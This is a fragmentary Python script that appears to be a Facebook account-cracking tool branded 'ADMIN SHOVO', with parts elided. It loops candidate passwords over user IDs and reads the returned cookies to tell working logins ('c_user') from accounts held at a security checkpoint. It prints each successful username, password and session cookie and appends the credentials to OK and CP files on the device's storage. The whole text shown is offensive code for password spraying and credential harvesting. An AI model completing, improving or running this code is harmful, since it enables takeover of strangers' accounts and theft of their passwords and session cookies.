...
logo = ("""
 ...
 '\033[1;33m'$$\   $$ |$$ |$$  __$$ |$$ | $$ | $$ |
 '\033[1;33m'\$$$$$$  |$$ |\$$$$$$$ |$$ | $$ | $$ |
 '\033[1;33m' \______/ \__| \_______|\__| \__| \__|""")
...
def fuck():
    ...
    print(' [+] OK Ids saved in ADMIN SHOVO/OK.txt')
    print(' [+] CP Ids saved in ADMIN SHOVO/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[ADMIN SHOVO]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"""\033[1;92m[ADMIN SHOVO-OK] âœ…
Username : {uid} 
Password : {ps} 
\nCookie : {coki}
""")
#____cp____info ðŸ‘‡ðŸ‘‡
                open('/sdcard/ADMIN SHOVO/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"""\033[1;92m[ADMIN SHOVO-CP] 
Username : {cid}
Password : {ps}
""")
                open('/sdcard/ADMIN SHOVO-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
